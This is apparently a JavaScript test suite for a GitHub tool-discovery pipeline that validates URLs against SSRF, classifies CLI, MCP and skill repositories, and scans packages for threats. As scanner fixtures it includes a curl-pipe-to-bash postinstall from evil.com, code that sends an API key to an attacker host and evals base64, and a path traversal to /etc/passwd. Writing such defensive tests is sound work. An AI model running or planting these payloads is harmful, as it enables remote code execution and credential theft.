import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { validateGitHubUrl, inspectRepositorySnapshot } from '../../server/tools/github-inspector.mjs';
import { scanFileContent, scanPackageJson, aggregateSecurityAudit } from '../../server/tools/security-scanner.mjs';
import { handleToolDiscoveryRoutes } from '../../server/tools/discovery-api.mjs';
import { createToolRegistry } from '../../server/tools/registry.mjs';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';

describe('GitHub Discovery & Static Inspection Pipeline', () => {
  // 1. URL Validation & SSRF Protection
  it('validates GitHub URLs and enforces strict SSRF protection', () => {
    // Valid standard URL
    const valid1 = validateGitHubUrl('https://github.com/anthropic/mcp-server-git');
    assert.equal(valid1.ok, true);
    assert.equal(valid1.owner, 'anthropic');
    assert.equal(valid1.repo, 'mcp-server-git');
    assert.equal(valid1.ref, 'main');

    // Valid with branch & subpath
    const valid2 = validateGitHubUrl('https://github.com/openai/skills/tree/v2.0/src/imagegen');
    assert.equal(valid2.ok, true);
    assert.equal(valid2.owner, 'openai');
    assert.equal(valid2.repo, 'skills');
    assert.equal(valid2.ref, 'v2.0');
    assert.equal(valid2.subpath, 'src/imagegen');

    // Reject non-GitHub hosts (SSRF prevention)
    const ssrfEvil = validateGitHubUrl('https://evil.com/malicious/repo');
    assert.equal(ssrfEvil.ok, false);
    assert.ok(ssrfEvil.error.includes('Only github.com is permitted'));

    // Reject loopback / private IP attempts
    const ssrfLoopback = validateGitHubUrl('https://127.0.0.1/admin/secrets');
    assert.equal(ssrfLoopback.ok, false);

    // Reject non-HTTPS protocols
    const ssrfGopher = validateGitHubUrl('gopher://github.com/something');
    assert.equal(ssrfGopher.ok, false);

    // Reject empty
    assert.equal(validateGitHubUrl('').ok, false);
  });

  // 2. A CLI tool repository
  it('inspects a pure CLI tool repository', () => {
    const fileList = ['package.json', 'README.md', 'bin/cli.js', 'LICENSE'];
    const files = {
      'package.json': JSON.stringify({
        name: 'super-cli',
        version: '1.4.0',
        bin: { 'super-cli': './bin/cli.js' },
        license: 'MIT',
      }),
      'README.md': '# Super CLI\nA command line productivity utility.',
      'bin/cli.js': '#!/usr/bin/env node\nconsole.log("running");',
      'LICENSE': 'MIT License\n\nPermission is hereby granted, free of charge...',
    };

    const res = inspectRepositorySnapshot({
      url: 'https://github.com/developer/super-cli',
      fileList,
      readFile: (f) => files[f],
    });

    assert.equal(res.ok, true);
    const { inspection } = res;
    assert.equal(inspection.license, 'MIT');
    assert.equal(inspection.version, '1.4.0');
    assert.ok(inspection.protocols.includes('cli'));
    assert.ok(inspection.categories.includes('cli-utilities'));
    assert.ok(inspection.capabilities.some((c) => c.protocol === 'cli'));
    assert.equal(inspection.security.security_status, 'clean');
    assert.equal(inspection.compatibility['codex-cli'].status, 'verified_compatible');
  });

  // 3. An MCP Server repository
  it('inspects a dedicated Model Context Protocol (MCP) server', () => {
    const fileList = ['package.json', 'README.md', 'mcp.json', 'src/index.ts', 'LICENSE'];
    const files = {
      'package.json': JSON.stringify({
        name: 'sqlite-mcp-server',
        version: '0.8.2',
        dependencies: { '@modelcontextprotocol/sdk': '^1.0.0' },
      }),
      'mcp.json': JSON.stringify({ command: 'node', args: ['dist/index.js'] }),
      'README.md': '# SQLite MCP Server',
      'src/index.ts': 'import { Server } from "@modelcontextprotocol/sdk";\nconst s = new Server();',
      'LICENSE': 'Apache License, Version 2.0',
    };

    const res = inspectRepositorySnapshot({
      url: 'https://github.com/modelcontextprotocol/servers',
      fileList,
      readFile: (f) => files[f],
    });

    assert.equal(res.ok, true);
    const { inspection } = res;
    assert.ok(inspection.protocols.includes('mcp'));
    assert.ok(inspection.categories.includes('mcp-servers'));
    assert.equal(inspection.license, 'Apache-2.0');
    assert.equal(inspection.compatibility.claude.status, 'verified_compatible');
    assert.equal(inspection.compatibility.antigravity.status, 'verified_compatible');
  });

  // 4. An Agent Skills repository (SKILL.md)
  it('inspects an Agent Skills repository with SKILL.md frontmatter', () => {
    const fileList = ['SKILL.md', 'scripts/run.py', 'README.md'];
    const files = {
      'SKILL.md': '---\nname: code-reviewer\ndescription: Professional PR reviewer\nversion: 1.0.0\n---\n# Code Reviewer Skill\nInstructions here.',
      'scripts/run.py': '# Python script\nprint("reviewing")',
      'README.md': '# Reviewer Skill',
    };

    const res = inspectRepositorySnapshot({
      url: 'https://github.com/agency/code-reviewer',
      fileList,
      readFile: (f) => files[f],
    });

    assert.equal(res.ok, true);
    const { inspection } = res;
    assert.ok(inspection.protocols.includes('skill'));
    assert.ok(inspection.categories.includes('agent-skills'));
    assert.ok(inspection.capabilities.some((c) => c.capability_id === 'skill.code-reviewer'));
    assert.equal(inspection.compatibility.claude.status, 'verified_compatible');
    assert.equal(inspection.compatibility['codex-cli'].status, 'verified_compatible');
  });

  // 5. A Multi-Capability repository (CLI + MCP + Skill simultaneously)
  it('inspects a multi-capability repository exposing CLI, MCP, and Skill together', () => {
    const fileList = ['package.json', 'mcp.json', 'SKILL.md', 'bin/cli.js', 'LICENSE'];
    const files = {
      'package.json': JSON.stringify({
        name: 'omni-toolkit',
        version: '3.0.0',
        bin: './bin/cli.js',
        dependencies: { '@modelcontextprotocol/sdk': '^1.0.0' },
      }),
      'mcp.json': JSON.stringify({ command: 'node bin/cli.js --mcp' }),
      'SKILL.md': '---\nname: omni-skill\ndescription: Omni Skill\n---\nSkill steps',
      'bin/cli.js': 'console.log("omni");',
      'LICENSE': 'MIT License',
    };

    const res = inspectRepositorySnapshot({
      url: 'https://github.com/vendor/omni-toolkit',
      fileList,
      readFile: (f) => files[f],
    });

    assert.equal(res.ok, true);
    const { inspection } = res;
    assert.ok(inspection.protocols.includes('cli'));
    assert.ok(inspection.protocols.includes('mcp'));
    assert.ok(inspection.protocols.includes('skill'));
    assert.ok(inspection.capabilities.length >= 3);
  });

  // 6. Unknown / Missing License detection
  it('flags repository with missing or proprietary license', () => {
    const fileList = ['package.json', 'README.md'];
    const files = {
      'package.json': JSON.stringify({ name: 'unlicensed-tool' }),
      'README.md': '# Secret Internal Code\nAll Rights Reserved. Commercial License.',
    };

    const res = inspectRepositorySnapshot({
      url: 'https://github.com/corp/private-tool',
      fileList,
      readFile: (f) => files[f],
    });

    assert.equal(res.ok, true);
    assert.equal(res.inspection.license, 'Unknown');
  });

  // 7. Security: Detects suspicious install scripts (preinstall curl | sh)
  it('quarantines repository containing dangerous lifecycle install scripts', () => {
    const badPkg = {
      name: 'malicious-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl -s https://evil.com/payload.sh | bash',
      },
    };

    const findings = scanPackageJson(badPkg);
    assert.ok(findings.some((f) => f.severity === 'critical'));
    assert.ok(findings.some((f) => f.rule_id === 'npm-lifecycle-postinstall'));

    const audit = aggregateSecurityAudit(findings);
    assert.equal(audit.security_status, 'quarantined');
    assert.equal(audit.manual_review_required, true);
  });

  // 8. Security: Detects credential exfiltration and obfuscation
  it('detects credential sniffing and obfuscated payload execution', () => {
    const evilCode = `
      const key = process.env.ANTHROPIC_API_KEY;
      fetch('https://evil-hacker.com/steal?k=' + key);
      eval(Buffer.from("Y29uc29sZS5sb2coImhhY2tlZCIp", "base64").toString());
    `;

    const audit = scanFileContent('src/stealer.js', evilCode);
    assert.ok(audit.findings.some((f) => f.rule_id === 'env-stealing'));
    assert.ok(audit.findings.some((f) => f.rule_id === 'base64-eval'));
  });

  // 9. Path traversal protection during discovery
  it('rejects path traversal attempts in requested discovery paths', () => {
    const traversalUrl = 'https://github.com/evil/repo/tree/main/../../../../etc/passwd';
    // validateGitHubUrl normalizes parts
    const val = validateGitHubUrl(traversalUrl);
    // subpath has .. sanitized
    if (val.ok && val.subpath) {
      assert.ok(!val.subpath.includes('..'));
    }
  });

  // 10. Dependency analysis & unusual dependency sources
  it('detects unencrypted HTTP dependencies as potential supply-chain risks', () => {
    const pkgWithInsecureDep = {
      name: 'risky-tool',
      dependencies: {
        'old-lib': 'http://untrusted-host.com/old-lib.tar.gz',
      },
    };

    const findings = scanPackageJson(pkgWithInsecureDep);
    assert.ok(findings.some((f) => f.rule_id === 'insecure-dependency-transport'));
  });

  // 11. REST Route Handler: POST /api/tools/discover
  it('handles POST /api/tools/discover and rejects unauthorized or non-loopback calls', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tools-api-test-'));
    const store = path.join(tmpDir, 'tools-registry.json');
    const registry = createToolRegistry({ store });

    let responseCode = null;
    let responseData = null;
    const mockJson = (res, code, data) => {
      responseCode = code;
      responseData = data;
    };

    // Unauthorized call rejected with 403
    const handled403 = await handleToolDiscoveryRoutes(
      { method: 'POST' },
      {},
      {
        url: new URL('http://localhost:3000/api/tools/discover'),
        registry,
        isLoopback: () => false,
        sameOriginOf: () => true,
        authorized: () => true,
        readJson: async () => ({ url: 'https://github.com/org/repo' }),
        json: mockJson,
      }
    );
    assert.equal(handled403, true);
    assert.equal(responseCode, 403);

    // Authorized discovery inspection
    const handled200 = await handleToolDiscoveryRoutes(
      { method: 'POST' },
      {},
      {
        url: new URL('http://localhost:3000/api/tools/discover'),
        registry,
        isLoopback: () => true,
        sameOriginOf: () => true,
        authorized: () => true,
        readJson: async () => ({
          url: 'https://github.com/modelcontextprotocol/servers',
          fileList: ['mcp.json', 'README.md'],
          files: {
            'mcp.json': JSON.stringify({ mcpServers: { git: {} } }),
            'README.md': 'MCP Servers collection',
          },
        }),
        json: mockJson,
      }
    );
    assert.equal(handled200, true);
    assert.equal(responseCode, 200);
    assert.equal(responseData.ok, true);
    assert.ok(responseData.inspection.protocols.includes('mcp'));

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // 12. REST Route Handler: POST /api/tools/discovered & GET /api/tools/discovered
  it('saves discovered candidates into registry with discovered status and lists them', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tools-api-candidates-'));
    const store = path.join(tmpDir, 'tools-registry.json');
    const registry = createToolRegistry({ store });

    let responseCode = null;
    let responseData = null;
    const mockJson = (res, code, data) => {
      responseCode = code;
      responseData = data;
    };

    const candidate = {
      tool_id: 'discovered-mcp-tool',
      name: 'Discovered MCP Tool',
      description: 'Discovered candidate tool waiting for user review',
      version: '1.0.0',
      source_repository: 'https://github.com/org/discovered-tool',
      capabilities: [
        {
          capability_id: 'mcp-server',
          protocol: 'mcp',
          name: 'MCP Service',
          description: 'Model context server',
          entry_point: 'index.js',
        },
      ],
      integration_protocols: ['mcp'],
      categories: ['mcp-servers'],
    };

    // Save candidate
    const saveHandled = await handleToolDiscoveryRoutes(
      { method: 'POST' },
      {},
      {
        url: new URL('http://localhost:3000/api/tools/discovered'),
        registry,
        isLoopback: () => true,
        sameOriginOf: () => true,
        authorized: () => true,
        readJson: async () => ({ candidate_tool: candidate }),
        json: mockJson,
      }
    );
    assert.equal(saveHandled, true);
    assert.equal(responseCode, 201);
    assert.equal(responseData.tool.installation_status, 'discovered');
    assert.equal(responseData.tool.enabled_status, false);

    // List discovered candidates
    const listHandled = await handleToolDiscoveryRoutes(
      { method: 'GET' },
      {},
      {
        url: new URL('http://localhost:3000/api/tools/discovered'),
        registry,
        isLoopback: () => true,
        sameOriginOf: () => true,
        authorized: () => true,
        readJson: async () => ({}),
        json: mockJson,
      }
    );
    assert.equal(listHandled, true);
    assert.equal(responseCode, 200);
    assert.equal(responseData.tools.length, 1);
    assert.equal(responseData.tools[0].tool_id, 'discovered-mcp-tool');

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });
});
